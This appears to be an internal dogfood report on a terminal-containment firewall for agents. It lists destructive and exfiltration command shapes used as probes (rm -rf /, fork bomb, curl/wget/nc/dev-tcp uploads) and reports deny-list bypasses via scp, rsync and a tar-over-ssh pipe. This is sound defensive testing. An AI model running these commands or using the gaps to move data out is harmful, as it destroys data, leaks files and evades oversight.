# Dogfood Run — 2026-09-19 (second run, evening tick)

Target: terminal-jail @ d80c0bf. Lane: terminal-jail-dogfood. Verdict: PROMISING-BUT-ROUGH.

## Promise under test
"Defense-in-depth terminal containment: the interruptor firewall blocks dangerous
command shapes before execution; the standalone CLI puts commands in a PID namespace;
a fresh user can install from the documented origin URL with one command."

## What was actually done (real use, not the test suite)
- Installed to a scratch HOME (/tmp/dogfood-tj2341/home) via ./install.sh — rc=0, <1s.
- Walked the documented quickstart verify flow live: --version, pidns-capability-probe,
  --user namespace-inode containment check, exit-code passthrough (bash -c 'exit 7' → 7),
  stdin passthrough, fdisk block rc=126, fs-isolation loud-degrade warning.
- Ran 25 adversarial commands through the interruptor bridge (the documented JSON oracle):
  destructive shapes (rm -rf /, dd, mkfs, fork bomb), egress exfil matrix (curl -d/-F/-T @file,
  wget --post-file, nc pipe/redirect, python socket+file, /dev/tcp, scp/rsync/tar|ssh),
  default-allow provenance checks (psql -c SELECT, cat /etc/passwd, git status).
- bwrap backend end-to-end: private /proc (4 entries, /proc/1 = bwrap reaper), exit
  passthrough rc=9, fail-closed on requested-but-missing bwrap (exit 2 + explicit message,
  verified with a PATH stripped of bwrap after two invalid first attempts — see diagnostics).
- Auto-sandbox (modify) workflow: make, pytest, go test, pip install all rewritten
  ("[terminal-jail] Modified: ... → sandboxed") and executed sandboxed, rc passthrough.
- Fresh-machine install leg on bunker-las-03 agent fb251522 (Debian 13, PyYAML-less,
  pip present under PEP 668): documented https clone OK (HEAD d80c0bf), ./install.sh rc=0,
  --rule-pack db correctly skipped with remediation message (DF-21 fix live), smoke PASS
  (FULL probe, containment inode, block rc=126, bridge provenance). Agent destroyed.

## Findings (filed as board rows, commit fcf1b8d)
- DF-TERMINAL-JAIL-29 [P1] scp/rsync scoped-source copies to a remote host ride
  default-allow (rule only arms on root-source whole-tree copies).
- DF-TERMINAL-JAIL-30 [P2] tar cf - <dir> | ssh host 'cat > /tmp/x' allow/null.
- DF-TERMINAL-JAIL-31 [P2] process: probe payloads never covered shapes the rule
  deliberately excludes — gap shipped silently for 2 runs.
- DF-TERMINAL-JAIL-32 [P2] fresh-install regression evidence (PASS) + las-03 leaked-user
  count now 33 (DF-26 leak growing).

## Re-verified live, still fixed
DF-21 (pack skip graceful), DF-16 (net-file-exfil pipe/redirect), DF-17 (curl -F,
interpreter egress), DF-11 (auto-sandbox on degraded hosts — modify preflight), DF-15
(loud mapped-launch fallback warning), default-allow provenance (rule_id null vs named),
fail-closed posture (bwrap missing → exit 2; bridge unavailable → rc=126 box with
warn-mode override).

## Value judgment
- Works? Yes — promised quickstart flow completes; firewall blocks the documented matrix.
- Useful? Yes — the deny-list firewall + namespace wrapper solve a real agent problem.
- Usable? High — install <5s, time-to-first-success <5s, docs matched reality at every step.
- Trustworthy? Mostly — fail-closed on every degradation path tested; BUT the exfil
  deny-list has a real hole (ssh-family file copies) that its own success story
  ("egress exfil blocked") does not disclose. Block-message honesty is good; catalog
  coverage honesty needs the same treatment.

## Time-to-first-success
<5s local (install 0s + first block immediate). Friction count: 2 (both minor:
--help documents env knobs but not rules.d structure; first `--user` run's
fs-isolation warning is correct but wordy).
